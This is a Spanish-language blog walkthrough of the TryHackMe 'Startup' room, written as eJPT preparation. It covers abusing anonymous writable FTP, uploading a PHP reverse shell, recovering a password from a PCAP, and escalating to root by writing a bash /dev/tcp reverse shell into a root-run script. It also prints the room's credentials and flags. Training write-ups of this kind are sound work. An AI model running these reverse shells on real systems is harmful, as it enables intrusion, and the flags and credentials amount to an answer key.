---
title: "Startup"
date: 2026-01-21
draft: false
description: "Walkthrough de Startup de TryHackMe. FTP anónimo con directorio writable, reverse shell via web, análisis de pcap con Wireshark y escalada por script de root con permisos incorrectos — preparación eJPT."
tags:
  [
    "walkthrough",
    "tryhackme",
    "ejpt",
    "linux",
    "ftp",
    "wireshark",
    "pcap",
    "privesc",
    "web",
    "reverseshell",
  ]
categories: ["Walkthroughs"]
series: ["Road to eJPTv2"]
ShowToc: true
TocOpen: false
weight: 12
---

## Resumen

**Startup** es la duodécima máquina de la serie _Road to eJPTv2_. Una máquina que encadena FTP anónimo con escritura, subida de reverse shell a través de web, análisis forense de un archivo PCAP con Wireshark para obtener credenciales, y una escalada de privilegios basada en permisos incorrectos en un script ejecutado por root.

Varias técnicas en una sola máquina — enumeración, explotación web, análisis de red y privesc por configuración incorrecta.

| Atributo       | Valor                                                              |
| -------------- | ------------------------------------------------------------------ |
| **Plataforma** | TryHackMe                                                          |
| **Dificultad** | Fácil                                                              |
| **OS**         | Linux (Ubuntu)                                                     |
| **Sala**       | [Startup](https://tryhackme.com/room/startup)                      |
| **Skills**     | FTP Enum, File Upload, PCAP Analysis, Script PrivEsc               |

### 🎥 Versión en video

{{< youtube EyEzcbH_rp8 >}}

> Si prefieres seguir el walkthrough paso a paso, continúa leyendo. El video cubre el mismo proceso en formato visual.

### Herramientas usadas

- `nmap` — escaneo de puertos y versiones
- `ftp` — acceso anónimo y subida de archivo
- `gobuster` — fuzzing de directorios web
- `netcat` — recepción de reverse shell y shell de root
- `python` — estabilización de shell y servidor HTTP
- `wireshark` — análisis de archivo PCAP
- `ssh` — acceso como lennie

### Resumen de la solución

1. **Reconocimiento:** nmap detecta FTP con acceso anónimo, SSH y HTTP.
2. **FTP anónimo:** `notice.txt` revela el usuario `maya`. El directorio `ftp/` tiene permisos de escritura total.
3. **Fuzzing web:** gobuster encuentra `/files/` — el directorio FTP accesible desde web.
4. **Reverse shell:** Subimos un PHP reverse shell al FTP, lo ejecutamos desde el navegador y recibimos conexión como `www-data`.
5. **Post-explotación:** `recipe.txt` responde una pregunta de la sala. En `/incidents/` encontramos un `suspicious.pcapng` que analizamos con Wireshark.
6. **Credenciales:** El PCAP contiene la contraseña de `lennie` en texto claro: `c4ntg3t3n0ughsp1c3`.
7. **SSH como lennie:** Accedemos y obtenemos la user flag.
8. **Privesc:** `planner.sh` (root) llama a `/etc/print.sh`, que es propiedad de `lennie`. Inyectamos una reverse shell en `print.sh`, esperamos la ejecución y recibimos shell de root.

---

## Reconocimiento

### Ping

Verificamos conectividad e identificamos el SO por el TTL:

```bash
ping -c 1 10.67.167.221
```

```
64 bytes from 10.67.167.221: icmp_seq=1 ttl=62 time=64.7 ms
```

TTL 62 → Linux (el valor original es 64, se decrementó en los saltos de red).

### Nmap — Escaneo de puertos

```bash
nmap 10.67.167.221 -n -Pn -sS -p- --open --min-rate=5000 -oG allTCPports
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Tres puertos — FTP es inmediatamente interesante por su potencial de acceso anónimo.

### Nmap — Versiones y scripts

```bash
nmap 10.67.167.221 -n -Pn -sS -p21,22,80 -sVC --min-rate=5000 -oN startupscan.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Nmap ya nos da todo lo necesario sobre el FTP: acceso anónimo permitido, y el subdirectorio `ftp/` con permisos `drwxrwxrwx` — escritura total para cualquier usuario.

---

## Enumeración FTP

### FTP anónimo

```bash
ftp 10.67.167.221 21
Name: anonymous
Password: [vacío]
```

```
ftp> dir
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

Descargamos ambos archivos:

```bash
ftp> get notice.txt
ftp> get important.jpg
```

Contenido de `notice.txt`:

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY.
People downloading documents from our website will think we are a joke!
Now I dont know who it is, but Maya is looking pretty sus.
```

> **Usuario encontrado:** `maya`

El directorio `ftp/` está vacío pero tiene permisos `777` — podemos subir archivos.

### Fuzzing web — gobuster

```bash
gobuster dir -u http://10.67.167.221 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,bak,css,xml,.ssh
```

```
/index.html   (Status: 200)
/files        (Status: 301)
```

`/files/` apunta directamente al contenido del FTP — incluyendo el subdirectorio `ftp/` con permisos de escritura. Esto nos da ejecución remota de código.

---

## Explotación

### Reverse shell via FTP + Web

Preparamos un PHP reverse shell (PentestMonkey) y lo subimos al directorio `ftp/` del FTP:

```bash
ftp> cd ftp
ftp> put rev.php
```

Ponemos netcat en escucha:

```bash
nc -lvnp 1234
```

Ejecutamos el shell accediendo desde el navegador:

```
http://10.67.167.221/files/ftp/rev.php
```

```
connect to [192.168.136.70] from (UNKNOWN) [10.67.167.221] 36770
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Acceso como `www-data`.

### Estabilización de la shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
www-data@startup:/$ export TERM=xterm
www-data@startup:/$ export SHELL=bash
```

---

## Post-Explotación

### recipe.txt

```bash
www-data@startup:/$ cat recipe.txt
Someone asked what our main ingredient to our spice soup is today.
I figured I can't keep it a secret forever and told him it was love.
```

> **Ingrediente secreto:** `love`

### Directorio incidents — PCAP sospechoso

Explorando el sistema encontramos un directorio inusual en la raíz:

```bash
www-data@startup:/$ ls /incidents
suspicious.pcapng
```

Servimos el archivo con Python para descargarlo en nuestra máquina:

```bash
www-data@startup:/incidents$ python3 -m http.server 8080
```

En nuestra máquina atacante:

```bash
wget http://10.67.167.221:8080/suspicious.pcapng
```

### Wireshark — Credenciales en texto claro

Abrimos el PCAP con Wireshark y analizamos el tráfico. Siguiendo los streams TCP encontramos credenciales transmitidas en texto claro:

> **Contraseña de lennie:** `c4ntg3t3n0ughsp1c3`

---

## Acceso como Lennie

### SSH con credenciales del PCAP

```bash
ssh lennie@10.67.167.221
Password: c4ntg3t3n0ughsp1c3
```

```
lennie@startup:~$ whoami
lennie
```

### User flag

```bash
lennie@startup:~$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

> **User flag:** `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`

---

## Escalada de privilegios

### Enumeración — scripts/

```bash
lennie@startup:~$ ls -l scripts/
-rwxr-xr-x 1 root   root   77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root    1 Jan 22 02:55 startup_list.txt
```

```bash
lennie@startup:~$ cat scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

`planner.sh` pertenece a root y llama a `/etc/print.sh`. Verificamos los permisos de `print.sh`:

```bash
lennie@startup:~$ ls -l /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

`/etc/print.sh` es propiedad de `lennie` — podemos modificarlo. Cuando `planner.sh` lo ejecute (como root), nuestro código correrá con privilegios de root.

### Explotación — Inyección en print.sh

Ponemos netcat en escucha:

```bash
nc -lvnp 4444
```

Reemplazamos el contenido de `print.sh` con una reverse shell:

```bash
lennie@startup:~$ echo '#!/bin/bash' > /etc/print.sh
lennie@startup:~$ echo 'bash -i >& /dev/tcp/192.168.136.70/4444 0>&1' >> /etc/print.sh
```

Esperamos a que el cron ejecute `planner.sh` y recibimos la conexión:

```bash
connect to [192.168.136.70] from (UNKNOWN) [10.67.167.221] 40054
root@startup:~#
```

### Root flag

```bash
root@startup:~# cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

> **Root flag:** `THM{f963aaa6a430f210222158ae15c3d76d}`

---

## Lecciones aprendidas

- **FTP anónimo con escritura es ejecución remota de código** — Un directorio FTP con permisos `777` accesible desde web equivale a RCE. Siempre verificar si los directorios FTP tienen correspondencia web con gobuster.
- **Los archivos PCAP son minas de oro forense** — Credenciales en texto claro en capturas de red es un hallazgo clásico en CTFs y en análisis de incidentes reales. Wireshark y `Follow TCP Stream` son habilidades esenciales.
- **Siempre revisar scripts llamados por root** — `planner.sh` llama a `print.sh`. La cadena de llamadas entre scripts puede crear vectores de privesc inesperados si algún script intermedio tiene permisos incorrectos.
- **Los permisos de archivos en `/etc/` deben ser de root** — Un script en `/etc/` propiedad de un usuario sin privilegios es una escalada garantizada si root lo ejecuta.
- **La información en texto claro nunca es segura en tráfico de red** — Contraseñas transmitidas sin cifrar son vulnerables a cualquiera que tenga acceso a la red o a una captura de tráfico.

### Para la eJPT

| Concepto                            | Relevancia eJPT                                       |
| ----------------------------------- | ----------------------------------------------------- |
| FTP anónimo + escritura             | Enumeración de servicios de red core del examen       |
| File upload via FTP → RCE           | Vector de explotación web realista                    |
| Análisis de PCAP                    | Reconocimiento y análisis forense básico              |
| PrivEsc por script con permisos mal | Escalada sin exploits de kernel — patrón del examen   |

**Tiempo aproximado de resolución:** 45-60 minutos.

---

## Referencias

- [Startup — TryHackMe](https://tryhackme.com/room/startup)
- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [Wireshark — Follow TCP Stream](https://www.wireshark.org/docs/wsug_html_chunked/ChAdvFollowStreamSection.html)
- [GTFOBins](https://gtfobins.github.io/)
